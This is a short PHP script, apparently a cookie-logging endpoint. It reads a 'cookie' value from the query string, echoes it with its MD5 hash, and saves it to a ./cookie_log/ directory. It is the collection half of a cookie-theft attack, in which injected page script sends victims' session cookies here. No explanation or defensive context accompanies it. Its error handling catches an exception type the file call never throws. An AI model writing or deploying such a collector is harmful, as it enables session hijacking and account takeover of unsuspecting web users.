<?php
$s = serialize(@$_GET['cookie']);
print $s;
print md5($s);
try {
    $ret = file_put_contents('./cookie_log/' . md5($s), $s);
    print $ret;
  } catch(PDOException $e) {
    print "エラー:{$e->getMessage()}";
  }